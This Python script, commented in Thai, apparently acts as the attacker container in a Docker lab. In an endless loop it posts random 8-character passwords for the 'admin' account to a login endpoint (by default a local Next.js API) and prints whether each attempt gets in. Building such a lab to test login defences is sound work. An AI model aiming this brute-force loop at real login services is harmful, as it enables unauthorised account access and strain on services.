import requests
import time
import os
import socket
import random
import string

# อ่าน URL เป้าหมายจาก Docker Compose (http://web:3000/api/login)
TARGET_URL = os.getenv("TARGET_URL", "http://localhost:3000/api/login")

# ฟังก์ชันดึง IP ของ Container ตัวเอง
def get_my_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Unknown"

def generate_random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def start_attack():
    my_ip = get_my_ip() # 👈 2. ดึง IP มาเก็บไว้

    print(f"[*] เริ่มต้นโจมตีไปที่: {TARGET_URL}")
    print("[*] กำลังรอให้ Web Server ตื่น... (5 วินาที)")
    time.sleep(5) # รอแป๊บนึงให้ Next.js บูทเสร็จ

    count = 0
    while True:
        try:
            # จำลองข้อมูล Login
            payload = {
                "username": "admin",
                "password": generate_random_password() # สุ่มรหัสผ่านผิดๆ
            }

            print(f"[BOT]{count} 🚀 กำลังส่ง Request จาก IP: {my_ip}" )
            count += 1
            # ยิง Request!
            response = requests.post(TARGET_URL, json=payload, timeout=2)

            # เช็คผลลัพธ์
            if response.status_code == 200:
                print(f"[BOT] ✅ เจาะเข้าได้แล้ว! Response: {response.text}")
            else:
                print(f"[BOT] ❌ เจาะไม่เข้า (Status: {response.status_code})")

        except Exception as e:
            print(f"[BOT] ⚠️ หาเครื่อง Web ไม่เจอ หรือ Web ล่มไปแล้ว: {e}")
        
        # หน่วงเวลาหน่อย เดี๋ยว Log วิ่งเร็วเกินมองไม่ทัน
        time.sleep(1) # เร็วขึ้นนิดนึง

if __name__ == "__main__":
    start_attack()